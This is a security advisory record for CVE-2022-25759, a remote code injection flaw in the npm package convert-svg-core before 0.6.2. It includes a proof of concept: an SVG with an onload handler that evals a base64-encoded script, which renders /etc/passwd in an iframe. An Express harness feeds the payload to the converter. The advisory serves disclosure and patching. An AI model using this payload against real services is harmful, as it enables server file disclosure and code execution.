advisory_id: GHSA-5gxc-fxcr-9326
datasource_id: github_osv_importer_v2/GHSA-5gxc-fxcr-9326
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/07/GHSA-5gxc-fxcr-9326/GHSA-5gxc-fxcr-9326.json
aliases:
  - CVE-2022-25759
summary: "convert-svg-core vulnerable to remote code injection\nThe package convert-svg-core\
  \ before 0.6.2 is vulnerable to Remote Code Injection via sending an SVG file containing the\
  \ payload in an `onload` attribute. Puppeteer/Chromium (used by convert-svg-core) will execute\
  \ any code within that tag, including malicious code.\n\n### PoC\n\n**Payload**\n\n```html\n\
  <svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='></svg>\n\
  ```\nwhere the `id` attribute is the base 64-encoded form of \n\n```js\ndocument.write('<svg-dummy></svg-dummy><iframe\
  \ src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0\
  \ 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"\
  0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>');\n```\n\n\n**Attack**\n\n```js\n\
  const { convert } = require('convert-svg-to-png');\nconst express = require('express');\n\
  const fileSvg = `[[[payload]]]`;\n// YWxlcnQoMSk=\n// function newContent(){document.open(),document.write('<text\
  \ x=\\\"0\\\" y=\\\"0\\\" class=\\\"Rrrrr\\\" id=\\\"demo\\\">data</text>'),document.close()}\n\
  const app = express();\napp.get('/poc', async (req, res)=>{\n  try {\n    const png = await\
  \ convert(fileSvg);\n    res.set('Content-Type', 'image/png');\n    res.send(png);\n  } catch\
  \ (e) {\n      console.log(e);\n    res.send(\"\");\n  }\n});\napp.listen(3000, ()=>{\n  console.log('started');\n\
  });\n```"
impacted_packages:
  - purl: pkg:npm/convert-svg-core
    affected_versions: vers:npm/<0.6.2
    fixed_versions: vers:npm/0.6.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/07/GHSA-5gxc-fxcr-9326/GHSA-5gxc-fxcr-9326.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/neocotic/convert-svg
    reference_type:
    reference_id:
  - url: https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5
    reference_type:
    reference_id:
  - url: https://github.com/neocotic/convert-svg/issues/81
    reference_type:
    reference_id:
  - url: https://github.com/neocotic/convert-svg/pull/82
    reference_type:
    reference_id:
  - url: https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-25759
    reference_type:
    reference_id: CVE-2022-25759
